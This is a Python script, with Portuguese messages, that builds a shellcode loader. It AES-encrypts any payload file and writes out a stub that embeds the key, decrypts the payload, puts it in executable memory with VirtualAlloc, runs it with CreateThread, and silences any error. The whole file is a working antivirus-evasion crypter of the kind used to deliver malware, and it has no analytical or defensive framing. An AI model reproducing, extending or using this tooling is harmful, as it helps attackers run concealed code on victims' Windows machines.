import sys
import base64

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

if len(sys.argv) != 3:
    print(f"Uso: python {sys.argv[0]} <caminho_do_payload> <caminho_do_stub_de_saida>")
    sys.exit(1)

input_payload_path = sys.argv[1]
output_stub_path = sys.argv[2]

AES_KEY = get_random_bytes(16)
IV = get_random_bytes(16)

cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)

try:
    with open(input_payload_path, "rb") as f:
        payload_bytes = f.read()
except FileNotFoundError:
    print(f"[-] Erro: O arquivo de payload '{input_payload_path}' não foi encontrado.")
    sys.exit(1)


encrypted_payload = cipher.encrypt(pad(payload_bytes, AES.block_size))
encrypted_b64 = base64.b64encode(encrypted_payload).decode()

stub = f"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import ctypes

encrypted_payload = "{encrypted_b64}"
AES_KEY = base64.b64decode("{base64.b64encode(AES_KEY).decode()}")
IV = base64.b64decode("{base64.b64encode(IV).decode()}")

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = -1

kernel32 = ctypes.windll.kernel32

kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
kernel32.CreateThread.restype = ctypes.c_void_p

kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]


def decrypt_payload(enc_payload, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_payload_bytes = base64.b64decode(enc_payload)
    decrypted_payload = unpad(cipher.decrypt(encrypted_payload_bytes), AES.block_size)
    return decrypted_payload

def execute_payload(payload):
    ptr = kernel32.VirtualAlloc(None, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        return

    buffer = ctypes.create_string_buffer(payload)
    kernel32.RtlMoveMemory(ptr, buffer, len(payload))

    handle = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if not handle:
        return
        
    kernel32.WaitForSingleObject(handle, INFINITE)


if __name__ == "__main__":
    try:
        decrypted_payload = decrypt_payload(encrypted_payload, AES_KEY, IV)
        execute_payload(decrypted_payload)
    except Exception as e:
        pass

"""

with open(output_stub_path, "w", encoding="utf-8") as stub_file:
    stub_file.write(stub)

print(f"[ + ] Stub gerado com sucesso: {output_stub_path}")

